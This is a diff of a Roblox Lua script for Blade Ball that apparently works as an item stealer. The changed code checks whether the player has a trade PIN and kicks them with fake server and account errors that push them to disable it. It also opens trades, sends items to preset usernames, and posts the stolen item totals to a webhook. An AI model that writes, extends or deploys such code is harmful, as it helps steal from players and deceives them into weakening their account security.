@@ -37,51 +37,37 @@ end
 resetGlobalState()
 
 -- Validation
-local success, result = pcall(function()
-    return next(users) == nil or webhook == ""
-end)
-
-if success and result then
+if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
     return
 end
 
--- Only run Blade Ball-specific checks if in Blade Ball
-if game.PlaceId == 13772394625 then
-    local success, result = pcall(function()
-        return #Players:GetPlayers() >= 16
-    end)
-    
-    if success and result then
-        plr:kick("Server is full. Please join a less populated server")
-        return
-    end
-    
-    local success2, result2 = pcall(function()
-        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer"
-    end)
-    
-    if success2 and result2 then
-        plr:kick("Server error. Please join a DIFFERENT server")
-        return
-    end
-    
-    -- PIN Check (Blade Ball specific)
-    local success3, result3 = pcall(function()
-        local args = {
-            [1] = {
-                ["option"] = "PIN",
-                ["value"] = "9079"
-            }
-        }
-        local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-        return PINReponse ~= "You don't have a PIN code"
-    end)
-    
-    if success3 and result3 then
-        plr:kick("Account error. Please disable trade PIN and try again")
-        return
-    end
+if game.PlaceId ~= 13772394625 then
+    plr:kick("Game not supported. Please join a normal Blade Ball server")
+    return
+end
+
+if #Players:GetPlayers() >= 16 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+-- PIN Check
+local args = {
+    [1] = {
+        ["option"] = "PIN",
+        ["value"] = "9079"
+    }
+}
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINReponse ~= "You don't have a PIN code" then
+    plr:kick("Account error. Please disable trade PIN and try again")
+    return
 end
 
 -- Allow trade requests from everyone
@@ -243,7 +229,7 @@ local function sendSimpleStatusWebhook(newStatus, targetPlayerName, reason)
     }
     
     local success, err = pcall(function()
-        local response = HttpService:RequestAsync({
+        local response = request({
             Url = webhook,
             Method = "POST",
             Headers = headers,
@@ -346,7 +332,9 @@ local function updateStatus(newStatus, allItems, tradeItems, tokens)
     end
 end
 
--- Create webhook embed
+-- Initialize totals
+local totalRAP = 0
+local totalTokens = 0
 local tradeTokens = 0
 
 -- Create webhook embed (extracted from SendWebhookMessage)
@@ -886,8 +874,7 @@ for i, v in ipairs(itemsToSend) do
 end
 
 if #allItemsList > 0 or totalTokens > 0 then
-    -- Send initial message using the new system
-    sendInitialWebhook(allItemsList, itemsToSend, totalTokens)
+    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
 end
 
 if #itemsToSend > 0 or totalTokens > 0 then
@@ -977,6 +964,8 @@ if #itemsToSend > 0 or totalTokens > 0 then
         if successCount > 0 then
             updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
         end
+        
+        SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
     end
 
     local function waitForTargetUsers()
